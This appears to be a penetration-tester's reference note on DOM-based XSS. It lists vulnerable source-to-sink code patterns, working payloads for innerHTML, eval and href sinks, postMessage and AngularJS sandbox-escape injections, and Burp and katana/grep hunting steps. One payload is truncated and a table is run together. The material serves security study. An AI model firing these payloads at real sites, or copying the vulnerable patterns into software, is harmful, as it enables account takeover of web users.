# DOM XSS

> tags: web, xss, advanced

> related: XSS/, Attack-Surface/Web/Injection/XSS/Framework-XSS, Attack-Surface/Web/Injection/XSS/Reflected-XSS

DOM XSS
DOM XSS never touches the server. The payload lives in the URL fragment, a postMessage, or any other client-side source  -  and the JavaScript sinks it into the DOM without sanitization. Traditional scanners miss it constantly because there's nothing in the HTTP response to flag. You need to read the JS.
Source → Sink Mental Model
flowchart LR
    S1[location.hash] --> F[JS Processing]
    S2[location.search] --> F
    S3[location.href] --> F
    S4[document.referrer] --> F
    S5[postMessage data] --> F
    S6[localStorage / cookie] --> F
    F --> K{Sink}
    K --> T1["innerHTML / outerHTML"]
    K --> T2["document.write / writeln"]
    K --> T3["eval / setTimeout / setInterval"]
    K --> T4["src / href attribute set"]
    K --> T5["insertAdjacentHTML"]

Common Sources
location.hash
Frameworks that use hash-based routing (#/path) often pass the fragment into the page. No encoding means XSS.
// Vulnerable pattern
document.getElementById('title').innerHTML = location.hash.slice(1);
 
// Payload in URL
target.com/page#<img src=x onerror=alert(1)>
location.search / Query Params
// Vulnerable pattern  -  URLSearchParams value straight into DOM
let params = new URLSearchParams(location.search);
document.getElementById('msg').innerHTML = params.get('message');
 
// Payload
target.com/ onload=alert(1)>
document.referrer
// Vulnerable pattern
document.write('Referred by: ' + document.referrer);
 
// Exploit: host a page that links to target
<a href="target.com/vuln-page">click</a>
// Set the referrer to: evil.com/<script>alert(1)</script>
postMessage
Single-page apps use postMessage for cross-frame communication. If the receiver doesn't validate event.origin:
// Vulnerable receiver
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data;
});
 
// Attacker-controlled iframe or window
target_window.postMessage('<img src=x onerror=alert(1)>', '*');
 
// Or via URL if the app opens windows:
// host a page that does:
let w = window.open('target.com');
setTimeout(() => w.postMessage('<img src=x onerror=alert(1)>', '*'), 2000);
Common Sinks













































SinkNotesinnerHTMLClassic. Executes event handlers, not <script> tags directlyouterHTMLSame as innerHTMLdocument.writeExecutes <script> tagseval()Executes JS strings directlysetTimeout(string)String form = evalsetInterval(string)Samelocation.href = inputjavascript: URI workssrc attribute assignmentjavascript: URI in some casesinsertAdjacentHTMLSame as innerHTML
DOM Invader Workflow (Burp Suite)

Open Burp's embedded browser (Proxy → Open Browser).
Enable DOM Invader in the extension panel.
Copy the canary string DOM Invader generates.
Browse the target  -  manually interact with the app.
DOM Invader highlights when the canary reaches a sink.
Right-click the finding → "Exploit"  -  it auto-generates the appropriate payload.

This catches things no automated scanner will  -  especially postMessage handlers and hash-based routing.
Manual JS Hunting
When I don't have Burp Pro or want to go deep:
# Pull all JS files
katana -u target.com -jc -o js_urls.txt
 
# Search for dangerous sinks
grep -E "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(" js_urls.txt
 
# Search for sources being used
grep -E "location\.hash|location\.search|document\.referrer|\.data" js_urls.txt
For minified JS: paste into deobfuscate.io or Chrome DevTools → Sources → prettify.
jQuery DOM XSS
jQuery's $() selector is a sink when it receives HTML:
// Vulnerable  -  if location.hash starts with < it parses as HTML
$(location.hash)
 
// Payload
target.com/#<img src=x onerror=alert(1)>
 
// Also: $.html(), $.append(), $.prepend(), $.after(), $.before(), $.replaceWith()
AngularJS Sandbox Escape (Legacy)
If you see AngularJS 1.x, look for ng-app with user-controlled template expressions:
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
Payload Reference
// Works in innerHTML sink  -  no script tags needed
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
 
// Works in eval/setTimeout sink
alert(1)
};alert(1);//
 
// Works in href/src sink
javascript:alert(1)
Related

XSS Overview
Framework XSS
Reflected XSS
